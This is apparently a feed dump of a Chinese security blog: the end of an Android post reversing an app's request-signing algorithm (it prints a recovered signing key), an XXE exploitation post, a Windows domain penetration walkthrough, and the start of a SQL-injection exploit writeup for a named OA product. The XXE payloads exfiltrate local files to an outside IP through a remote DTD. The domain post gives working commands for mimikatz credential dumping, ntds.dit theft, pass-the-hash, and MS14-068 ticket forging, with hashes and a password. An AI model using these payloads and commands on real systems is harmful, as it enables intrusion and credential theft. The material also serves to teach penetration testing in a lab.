<p>这个貌似靠谱，可以追踪到进行请求的代码，于是我从第一个结果开始分析，一路往下，追踪，大概搞清楚了发送 请求的流程，以及一些参数的得到方式，但是貌似是看花眼了，而且程序的混淆强度比较大，没用找到 <code>_r</code> 和 <code>sign</code> 设置位置。 于是开始了其他的定位尝试</p>
<p><strong>监控 系统层的 加密类和方法</strong></p>
<p>进行签名常用的方案就是 对待签名数据，算 <code>hash</code> 或者 用一些加密算法。于是想着是不是可以通过监控  <code>java</code> 层常用的 加密 <code>api</code> 来定位 算法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/Chenyuxin/CryptoFucker</div></pre></td></tr></table></figure>
<p>找到了这个插件， 通过 <code>hook</code> 的方式来监控， 同时会在 <code>/sdcard/ydsec/包名.txt</code> 留下日志。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520666509744ry7zxzuh.png?imageslim" alt="paste image"><br>试了试，发现也没有找到相关的数据，通过这样的方式被加密，于是推测应该是自己实现了相关的加密算法。</p>
<p><strong>再次搜参数名</strong></p>
<p>忽然想起，参数名如果在程序中被使用的话应该是直接存在于程序中的， 然后 <code>smali</code> 代码引用字符串 会加上  <code>&quot;</code>  来包裹字符串</p>
<p>开始了另一种搜索尝试 </p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520667050773yt7w8i0k.png?imageslim" alt="paste image"></p>
<p>发现搜 <code>&quot;sign&quot;</code>  和 <code>&quot;sign</code>  得到的结果不多，但是貌似都不太相关，倒是 <code>&quot;_r&quot;</code> ，就两个结果。</p>
<p>想起 既然 <code>_r</code> 用于标识请求的唯一性，那么签名肯定是要用到它的，而且 <code>_r</code> 应该没次都是随机生成的，那么用到它的位置，应该离 生成 <code>sign</code> 的位置不远了。</p>
<p>进入第一个结果的代码（程序太大了，jeb打不开之前的我分析时的数据，只能重新看没有命名函数名的了）<br> <img src="http://oy9h5q2k4.bkt.clouddn.com/1520667677558w7kl0mwc.png?imageslim" alt="paste image"></p>
<p>可以知道 <code>_r</code> 通过  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;&quot;)</div></pre></td></tr></table></figure>
<p>生成随机字符串，来保证数据包不被重放<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1520667820837k2lq2qnm.png?imageslim" alt="paste image"></p>
<p>生成 <code>_r</code> 后 ，会调用 <code>a.N</code> ，其中会调用 <code>aa.ao</code> ，跟进去看看</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520668046392q6505tls.png?imageslim" alt="paste image"></p>
<p>根据 <code>URL(url)</code> 可以确定 ，第一个参数是一个 <code>url</code>, 接着对 <code>url</code> 上的参数进行了处理。</p>
<p>然后定位 <code>sign</code> 参数的起始位置<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1520668221974jpoch0s2.png?imageslim" alt="paste image"></p>
<p>接着删除了  <code>sign</code> 参数</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520668270856l9wslm3o.png?imageslim" alt="paste image"></p>
<p>然后重新生成 <code>sign</code> 参数</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520668398003n16txjaj.png?imageslim" alt="paste image"></p>
<p>调用了 <code>Riddle.s</code> 生成了 <code>sign</code> 参数，传入的参数是 处理后的 <code>url_path</code> 和 签名用的 <code>key</code> 。</p>
<p> <code>Riddle.s</code> 是一个 <code>native</code> 方法， 在 <code>libtnpn.so</code> 里面，去 <code>lib\armeabi</code>目录下找就是了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520668495137czd6n94w.png?imageslim" alt="paste image"></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15206685726055jk16ij3.png?imageslim" alt="paste image"></p>
<p>拖进 <code>ida</code> 发现 <code>so</code> 倒是挺友好的 ，没有混淆。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520668642579yq9t6rkx.png?imageslim" alt="paste image"></p>
<p>进入 <code>Java_cn_mucang_android_core_jni_Riddle_s</code>, 这就是  <code>Riddle.s</code> 方法在 <code>so</code> 中的命名，<code>jni</code> 函数的第一个参数类型为 <code>JNIEnv_ *</code> , 首先 需要导入 <code>jni.h</code> , 然后设置一下类型便于分析。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15206688246454wxwi1zj.png?imageslim" alt="paste image"><br>首先就是把传入的 参数变成 <code>c</code> 语言中的字符串类型，然后根据 <code>key</code> 的格式判断， 使用哪种签名方案，经过调试重置密码用的 <code>key</code> 为 <code>*#06#i3lrRYudcZZ2fIx9fI6VqJV8</code></p>
<p>所以会调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ver = j_j_SignUrl1(path, sign_key_1 + 5, &amp;v13);</div></pre></td></tr></table></figure></p>
<p>跟进到 <code>SignUrl1</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520669101797hivzbpim.png?imageslim" alt="paste image"></p>
<p>首先对 <code>key</code> 进行解密，然后进入 <code>j_j_SignUrl0</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520669189528llqyet3e.png?imageslim" alt="paste image"></p>
<p>流程很清晰，就是 拼接 <code>path</code> 和 解密后的 <code>key</code>, 然后计算 <code>md5</code>, 存在 <code>a3</code> 地址，回到 <code>SignUrl1</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520669320542tsrz1zio.png?imageslim" alt="paste image"></p>
<p>接着又对传入的 <strong>没有被解密的key</strong> 来了一个求和，然后进入 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">calc_sum(key_sum, 19);</div></pre></td></tr></table></figure>
<p>这个函数有点复杂，我是直接抠了出来，用 <code>python</code> 重写了。先继续看后面。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1520669559847xli1dip5.png?imageslim" alt="paste image"></p>
<p>把 <code>v11</code> 的值 附加到 之前刚刚计算好的 <code>md5</code> 的数值后面，<code>v11</code> 来自于 <code>v14</code>， 而 <code>v14</code> 并没有设置的地方，这里是 <code>IDA F5</code> 识别错了。直接看汇编把。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/152066973475718b6yh8z.png?imageslim" alt="paste image"></p>
<p>实际上 <code>v14</code> 就是调用 <code>calc_sum</code> 后的 <code>r1</code> 寄存器。</p>
<p>跟进到 <code>sub_788640D4</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1520669818066jmtjo8rl.png?imageslim" alt="paste image"></p>
<p>首先对传入的参数和 <code>lr</code> 进行了保存，然后调用 <code>sub_78864000</code> , 然后用之前保存的参数值 与 <code>sub_78864000</code> 的返回值进行运算，结果保存到 <code>r1</code>（专门用来迷惑 ida  ^_^）.</p>
<p>伪代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a1 = sub_78864000(a1,a2)</div><div class="line">t = save_a2 * a1</div><div class="line">ret = save_a1 - t</div><div class="line">return ret</div></pre></td></tr></table></figure></p>
<p> <code>sub_78864000</code> 看起来比较复杂，我就直接用 <code>python</code>, 照着重写了一遍。</p>
<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/152067013484257vk8yf4.png?imageslim" alt="paste image"></p>
<p> 其中有一个有意思的地方: <code>ida</code> 无法 对 <code>clz</code> 指令进行转换，所以用</p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521117298517w9q8htt4.png" alt="paste image"></p>
<p> 表示 </p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521117308128jcw6y8hy.png" alt="paste image"></p>
<p> 这使得重写造成了困扰，我的解决办法是，根据 <code>clz</code> 的作用，自己实现。</p>
<p> <img src="http://oy9h5q2k4.bkt.clouddn.com/15206703207513g565qy9.png?imageslim" alt="paste image"></p>
<p> 实现的 <code>python</code> 代码如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">def calc_clz(reg):</div><div class="line">   return 32 - len(str(bin(reg))[2:])</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 安卓安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 协议分析 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[xxe漏洞实战]]></title>
      <url>/2018/03/15/play_xxe_vuln.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在 2017 年版的 <code>OWASP TOP 10</code>， <code>xxe</code> 强势上位。</p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521125994380270rdrv9.png" alt="paste image"></p>
<p>本文对网上常见的利用方式做一个汇总</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">win10 phpstudy</div></pre></td></tr></table></figure>
<p>测试代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$data = file_get_contents(&apos;php://input&apos;);</div><div class="line"></div><div class="line">echo $data;</div><div class="line"></div><div class="line"></div><div class="line">$dom = new DOMDocument();</div><div class="line">$dom-&gt;loadXML($data);</div><div class="line"></div><div class="line">print_r($dom);</div></pre></td></tr></table></figure>
<p>就是直接对 <code>POST</code> 数据进行 <code>xml</code> 解析。</p>
<p><strong>读取本地文件（有回显）</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///e:/flag.txt&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure>
<p>上面是读取 <code>e:/flag.txt</code> 文件的内容，然后使用 <code>&amp;xxe;</code> 引用</p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/15211140206257yy1e3aq.png" alt="paste image"></p>
<p><strong>读取本地文件（无回显）</strong></p>
<p>发送的 <code>payload</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</div><div class="line">&lt;!DOCTYPE data [</div><div class="line">&lt;!ENTITY % remote SYSTEM &quot;http://45.63.0.120:8000/ed.dtd&quot;&gt;</div><div class="line">%remote;</div><div class="line">%send;</div><div class="line">]&gt;</div><div class="line">&lt;data&gt;4&lt;/data&gt;</div></pre></td></tr></table></figure>
<p><code>http://45.63.0.120:8000/ed.dtd</code> 的内容为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % payload SYSTEM &quot;file:///e:/flag.txt&quot;&gt;</div><div class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://45.63.0.120:2345/%payload;&apos;&gt;&quot;&gt;</div><div class="line">%param1;</div></pre></td></tr></table></figure>
<p>大概的流程如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">程序解析 我们发送的 payload</div><div class="line">解析到引用了外部实体，加载</div><div class="line">第一行获取 e:/flag.txt 的内容为 payload 的值</div><div class="line">第2行 往指定端口发送 http 数据，加上payload 的值</div></pre></td></tr></table></figure>
<p>首先 用 <code>nc</code> 监听 <code>45.63.0.120:2345</code> , 同时在 <code>45.63.0.120:8000</code> 起一个 <code>http server</code></p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521114413274a2ucsgsi.png" alt="paste image"></p>
<p><code>nc</code> 成功接收到了数据。</p>
<p>可以对文件内容做个 <code>base64</code> 编码 ,此时的 <code>dtd</code> 文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % payload SYSTEM &quot;php://filter/read=convert.base64-encode/resource=e:/flag.txt&quot;&gt;</div><div class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://45.63.0.120:2345/%payload;&apos;&gt;&quot;&gt;</div><div class="line">%param1;</div></pre></td></tr></table></figure></p>
<p><strong>使用XXEinjector自动化</strong></p>
<p>脚本链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/enjoiz/XXEinjector</div></pre></td></tr></table></figure>
<p><code>XXEinjector</code> 和 <code>sqlmap</code> 是一种类似的方式，对正常的数据包请求包进行注入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">sudo ruby XXEinjector.rb --host=192.168.211.131 --file=/home/haclh/XXEinjector/req.txt --oob=http --path=/e:/flag.txt --verbose </div><div class="line"></div><div class="line">--host 本机 ip</div><div class="line">--file 正常请求的数据包文件，可以用 burp 抓取</div><div class="line">--path 需要读取的文件</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1521164359037xk2bnis2.png?imageslim" alt="paste image"></p>
<p><strong>参考</strong></p>
<p><a href="https://goo.gl/kmF1MM" target="_blank" rel="external">https://goo.gl/kmF1MM</a></p>
<p><a href="https://b1ngz.github.io/XXE-learning-note/" target="_blank" rel="external">https://b1ngz.github.io/XXE-learning-note/</a></p>
<p><a href="https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection" target="_blank" rel="external">https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection</a></p>
]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[windows域渗透实战]]></title>
      <url>/2018/03/13/windows_hack_domain.html</url>
      <content type="html"><![CDATA[<h5 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">域控： 192.168.211.130</div><div class="line"></div><div class="line">已经控制的机器： 192.168.211.133</div></pre></td></tr></table></figure>
<h5 id="获取网络信息"><a href="#获取网络信息" class="headerlink" title="获取网络信息"></a>获取网络信息</h5><p>查看机器的网络信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ipconfig /all  # 查看 网卡信息，获取dns 服务器ip (域控)</div><div class="line">arp -a  # 搜集内网信息</div></pre></td></tr></table></figure></p>
<p>  <img src="http://oh1jgyw0v.bkt.clouddn.com/15211232022134scm0u5c.png" alt="paste image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">net view   #查看网络中的机器</div><div class="line">net view /domain # 查看网络中的域</div><div class="line">net view /domain:domainhack  # 查看 domainhack 域中的机器</div></pre></td></tr></table></figure>
<p>通过 <code>ping 机器名</code> 可以获取 <code>ip</code></p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521123218477x1c05ycj.png" alt="paste image"></p>
<h6 id="查找-域控"><a href="#查找-域控" class="headerlink" title="查找 域控"></a>查找 域控</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">dsquery server</div><div class="line">net time /domain</div><div class="line">ipconfig /all  查看 dns 信息</div><div class="line">端口扫描，域控服务器会开放389端口，如果和DNS同服务器，那么也会有53</div></pre></td></tr></table></figure>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521123590029lr0umn3r.png" alt="paste image"></p>
<p><code>ipc$</code> 攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">net view 192.168.211.130   #查看共享</div><div class="line">net use \\192.168.211.130\ipc$ password /user:hacker  # ipc$ 连接</div></pre></td></tr></table></figure>
<p>如果有共享的话，直接 <code>copy</code> 复制文件，然后 <code>at</code> 执行。</p>
<h5 id="获取-hash"><a href="#获取-hash" class="headerlink" title="获取 hash"></a>获取 hash</h5><h6 id="直接抓"><a href="#直接抓" class="headerlink" title="直接抓"></a>直接抓</h6><p>使用   <code>mimikatz</code> 抓取登录过的明文</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &gt; pssword.txt</div></pre></td></tr></table></figure>
<h6 id="导出-ntds-dit-获取-hash"><a href="#导出-ntds-dit-获取-hash" class="headerlink" title="导出 ntds.dit, 获取 hash"></a>导出 <code>ntds.dit</code>, 获取 <code>hash</code></h6><p><strong>导出 <code>ntds.dit</code></strong></p>
<p>方法一 <code>ntdsutil</code></p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521123848817a2nfthez.png" alt="paste image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ntdsutil snapshot &quot;List All&quot; quit quit   # 列举快照</div><div class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit #  创建快照</div><div class="line">ntdsutil snapshot &quot;mount &#123;77e43351-f29c-4bb2-86ad-cc6b7610589d&#125;&quot;  # 挂载快照</div><div class="line">copy C:\$SNAP_201803152221_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit   #复制ntds.dit</div></pre></td></tr></table></figure>
<p>操作完后记得删除快照</p>
<p>方法二 <code>vssadmin</code></p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521123965510audg7fbk.png" alt="paste image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">vssadmin list shadows # 查询当前系统的快照</div><div class="line">vssadmin create shadow /for=c: #创建快照</div><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\ntds.dit c:\ntds.dit #  复制ntds.dit</div><div class="line">vssadmin delete shadows /for=c: /quiet #删除快照</div></pre></td></tr></table></figure>
<p>方法三 <code>vshadow</code><br>下载链接 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://edgylogic.com/blog/vshadow-exe-versions/</div></pre></td></tr></table></figure>
<p>创建 <code>a.bat</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">setlocal</div><div class="line">if NOT &quot;%CALLBACK_SCRIPT%&quot;==&quot;&quot; goto :IS_CALLBACK</div><div class="line">set SOURCE_DRIVE_LETTER=%SystemDrive%</div><div class="line">set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit</div><div class="line">set DESTINATION_PATH=%~dp0</div><div class="line">@echo ...Determine the scripts to be executed/generated...</div><div class="line">set CALLBACK_SCRIPT=%~dpnx0</div><div class="line">set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd</div><div class="line">@echo ...Creating the shadow copy...</div><div class="line">&quot;%~dp0vshadow-2008-x64.exe&quot; -script=%TEMP_GENERATED_SCRIPT% -exec=&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%</div><div class="line">del /f %TEMP_GENERATED_SCRIPT%</div><div class="line">@goto :EOF</div><div class="line">:IS_CALLBACK</div><div class="line">setlocal</div><div class="line">@echo ...Obtaining the shadow copy device name...</div><div class="line">call %TEMP_GENERATED_SCRIPT%</div><div class="line">@echo ...Copying from the shadow copy to the destination path...</div><div class="line">copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%</div></pre></td></tr></table></figure>
<p>把 <code>vshadow-2008-x64.exe</code> 放到 <code>a.bat</code> 同级目录（win 2008为例）<br>然后 <code>cmd /c start a.bat</code> 调用之， 就会在 <code>a.bat</code> 目录下生成 <code>ntds.dit</code></p>
<p>然后使用 </p>
<p><strong>获取 <code>system.hiv</code></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg save hklm\system system.hiv</div></pre></td></tr></table></figure>
<p><strong><code>QuarksPwDump.exe</code> 导出 <code>hash</code></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">QuarksPwDump.exe --dump-hash-domain --with-history --ntds-file ntds.dit --system-file  system.hiv</div></pre></td></tr></table></figure>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521124024508l7c63la7.png" alt="paste image"></p>
<h5 id="pass-the-hash-攻击"><a href="#pass-the-hash-攻击" class="headerlink" title="pass-the-hash 攻击"></a>pass-the-hash 攻击</h5><p><strong>wmiexec</strong></p>
<p>下载地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/maaaaz/impacket-examples-windows</div></pre></td></tr></table></figure>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/15211240397492omtt7bh.png" alt="paste image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">wmiexec -hashes AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09 domainhack/Administrator@192.168.211.130 &quot;whoami&quot;</div><div class="line"></div><div class="line"></div><div class="line">domainhack 为域名</div><div class="line">Administrator  域用户</div><div class="line">192.168.211.130  目标 IP</div></pre></td></tr></table></figure>
<p><strong>psexec</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">psexec.exe -hashes AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09 domainhack/Administrator@192.168.211.130 &quot;whoami&quot;</div></pre></td></tr></table></figure>
<p><strong>pass-the-ticket</strong></p>
<p><strong>goldenPac</strong></p>
<p>要求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">域名， 普通域用户账号密码， 域控名</div></pre></td></tr></table></figure>
<p>下载地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/maaaaz/impacket-examples-windows</div></pre></td></tr></table></figure>
<p>直接获取域控<code>system</code> 权限的 <code>cmd</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">goldenPac domainhack.com/hacker@domainc.domainhack.com</div><div class="line">goldenPac 域名/用户名@域控名称</div><div class="line">然后会要求输入密码</div></pre></td></tr></table></figure>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/152112412508049bigl5e.png" alt="paste image"></p>
<p><strong>wce</strong></p>
<p>要求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">域控用户名 ，hash (用前面的方法获取)</div><div class="line">本机 administor 权限</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wce -s Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09</div></pre></td></tr></table></figure>
<p><strong>keko</strong></p>
<p>下载地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/gentilkiwi/kekeo</div></pre></td></tr></table></figure>
<p>要求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">域控用户名 ，hash (用前面的方法获取)</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">生成票据</div><div class="line">kekeo &quot;tgt::ask /user:Administrator /domain:domainhack.com /ntlm:A812E6C2DEFCB0A7B80868F9F3C88D09&quot;</div><div class="line"></div><div class="line">导入票据</div><div class="line">kekeo &quot;kerberos::ptt TGT_Administrator@DOMAINHACK.COM_krbtgt~domainhack.com@DOMAINHACK.COM.kirbi&quot;</div></pre></td></tr></table></figure>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/152112423094343f4brg2.png" alt="paste image"><br><strong>ms14-068.exe</strong></p>
<p>下载地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-068/MS14-068.exe</div></pre></td></tr></table></figure>
<p>要求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">域控用户名 ， 密码</div><div class="line">用户 sid  # whoami /all 获取</div></pre></td></tr></table></figure>
<p>执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">生成 票据</div><div class="line">ms14-068.exe -u hacker@domainhack.com -s S-1-5-21-2864277510-2444243591-773573486-1113 -d 192.168.211.130 -p qaz123!@#</div><div class="line"></div><div class="line"></div><div class="line">ms14-068.exe -u 用户名@域名 -s 用户sid -d 域控地址 -p 用户名密码</div><div class="line">导入票据</div><div class="line"></div><div class="line">Mimikatz.exe &quot;kerberos::ptc TGT_hacker@domainhack.com.ccache&quot;</div></pre></td></tr></table></figure>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521124251445u03izrb4.png" alt="paste image"></p>
<p><img src="http://oh1jgyw0v.bkt.clouddn.com/1521124244785pdoycxax.png" alt="paste image"></p>
<p>导入票据后就相当于有了 域管理员的权限， 直接添加域管理员<br><img src="http://oh1jgyw0v.bkt.clouddn.com/1521124239831rzlrzjug.png" alt="paste image"></p>
<p><strong>参考</strong></p>
<p><a href="https://3gstudent.github.io/" target="_blank" rel="external">https://3gstudent.github.io/</a></p>
]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows域 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[然之协同系统6.4.1 SQL注入之exp编写]]></title>
      <url>/2018/03/13/ranzhi_oa_641_exp.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前面已经说明了 漏洞成因，这里介绍一下 <code>exp</code> 的编写。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>为了 <code>getshell</code> 或者是 <code>任意文件下载</code>， 我们需要修改 数据库中的 <code>前缀sys_file</code> 表， 所以我们的利用方式如下</p>
<ul>
<li>使用 <code>sql</code> 注入 获取程序数据库中任何一个表名, 取得前缀 <code>pre</code></li>
<li>然后向 <code>presys_file</code> 中插入目标路径。</li>
</ul>
<p>在 <code>mysql 5</code> 中可以使用 <code>information_schema</code>  来获取指定数据库中的表。</p>
